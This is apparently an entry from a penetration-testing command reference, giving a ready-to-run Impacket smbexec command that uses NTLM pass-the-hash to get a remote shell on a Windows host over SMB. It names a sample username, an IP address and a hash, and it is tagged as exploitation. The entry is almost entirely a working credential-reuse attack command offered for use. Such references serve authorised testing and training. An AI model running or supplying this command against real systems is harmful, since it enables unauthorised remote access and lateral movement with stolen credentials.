---
description: Execute commands remotely over SMB using Impacket's smbexec with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-smbexec -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 john@10.10.10.1

items:
  - Hash
  - Shell
  - PowerShell

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation

references:
  - https://github.com/fortra/impacket
  - https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
---
